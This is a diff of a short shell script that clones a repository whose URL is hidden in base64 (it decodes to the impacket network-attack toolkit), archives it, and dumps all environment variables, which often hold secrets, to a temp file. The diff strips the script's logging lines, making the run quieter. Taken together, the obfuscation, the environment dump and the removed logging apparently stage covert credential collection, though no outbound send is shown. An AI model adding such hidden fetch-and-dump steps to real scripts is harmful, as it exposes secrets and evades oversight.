@@ -1,20 +1,13 @@
 set -eo pipefail
 
 RES=`mktemp`
-ARCHIVE=`mktemp XXXXXXXXXX.tar.gz`
+ARCHIVE=`mktemp`
 
 REPO=`echo -n "aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldA==" | base64 -d`
 REPO_PATH=`echo $REPO | awk -F '/' '{print $NF}'`
 
-echo "REPO is $REPO"
-echo "REPO_PATH is $REPO_PATH"
-echo "RES is $RES"
-echo "ARCHIVE is $ARCHIVE"
-
 git clone $REPO --single-branch
-
-echo "archiving $REPO_PATH into $ARCHIVE"
-tar cvzf $ARCHIVE $REPO_PATH
+tar czf $ARCHIVE $REPO_PATH
 
 env > $RES
 
